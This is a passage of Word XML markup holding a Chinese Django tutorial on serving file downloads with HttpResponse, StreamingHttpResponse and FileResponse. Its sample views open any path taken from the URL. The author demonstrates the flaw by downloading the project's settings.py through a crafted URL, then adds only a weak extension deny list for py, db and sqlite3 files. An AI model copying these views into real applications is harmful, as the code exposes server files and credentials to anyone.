          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return HttpResponse(c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFAB211"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然而该方法有个问题，如果文件是个二进制文件，HttpResponse输出的将会是乱码。对于一些二进制文件(图片，pdf)，我们更希望其直接作为附件下载。当文件下载到本机后，用户就可以用自己喜欢的程序(如Adobe)打开阅读文件了。这时我们可以对上述方法做出如下改进， 给response设置content_type和Content_Disposition。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E20DB6F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659A85AF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponse, Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3D16CB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78A63CB2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def media_file_download(request, file_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D983D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    with open(file_path, 'rb') as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFB685D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E450DF3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            response = HttpResponse(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAB508B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            response['content_type'] = "application/octet-stream"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D66AF5E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644E8EDF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE7A8B8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        except Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558E07FF" w14:textId="34CBF0F5" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BFD1B6" w14:textId="53E083B4" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>HttpResponse有个很大的弊端，其工作原理是先读取文件，载入内存，然后再输出。如果下载文件很大，该方法会占用很多内存。对于下载大文件，Django更推荐StreamingHttpResponse和FileResponse方法，这两个方法将下载文件分批(Chunks)写入用户本地磁盘，先不将它们载入服务器内存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F06F97B" w14:textId="19EBFF09" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法二: 使用SteamingHttpResonse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D42AB9A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF54B3B" w14:textId="759CC2D9" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponse, Http404, StreamingHttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0065836F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def stream_http_download(request, file_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B38C48A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226E4B20" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response = StreamingHttpResponse(open(file_path, 'rb'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779376B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response['content_type'] = "application/octet-stream"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33032E47" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24804441" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C0D42D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041D9394" w14:textId="1A7B1DF2" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608B73D8" w14:textId="25602CA0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法三: 使用FileResonse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E7FEDB"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FileResponse方法是SteamingHttpResponse的子类，是小编我推荐的文件下载方法。如果我们给file_response_download加上@login_required装饰器，那么我们就可以实现用户需要先登录才能下载某些文件的功能了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C5E3C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10525095" w14:textId="2D0EA1C1" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponse, Http404, FileResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F12BF3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def file_response_download1(request, file_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673F4427" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCD16BB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response = FileResponse(open(file_path, 'rb'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFAD940" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response['content_type'] = "application/octet-stream"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E099C4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431B341D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BCA495" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F290C26" w14:textId="61FC7483" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C3D98F"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lastRenderedPageBreak/>
        <w:t>然而即使加上了@login_required的装饰器，用户只要获取了文件的链接地址, 他们依然可以通过浏览器直接访问那些文件。我们等会再谈保护文件的链接地址和文件私有化，因为此时我们还有个更大的问题需要担忧。我们定义的下载方法可以下载所有文件，不仅包括.py文件，还包括不在media文件夹里的文件(比如非用户上传的文件)。比如当我们直接访问127.0.0.1:8000/file/download/file_project/settings.py/时，你会发现我们连file_project目录下的settings.py都下载了。如果哪个程序员这么蠢，你可以将他直接fire了。所以我们在编写下载方法时，我们一定要限定那些文件可以下，哪些不能下或者限定用户只能下载media文件夹里的东西。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6C5C43" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def file_response_download(request, file_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C63DA5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = os.path.basename(file_path).split('.')[-1].lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572F6C5E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # cannot be used to download py, db and sqlite3 files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028C4B20" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if ext not in ['py', 'db',  'sqlite3']:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4AB9F6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response = FileResponse(open(file_path, 'rb'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEDDD31" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response['content_type'] = "application/octet-stream"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA4F130" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response['Content-Disposition'] = 'attachment; filename=' + os.path.basename(file_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1C25B5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return response</w:t>
      </w:r>
    </w:p>
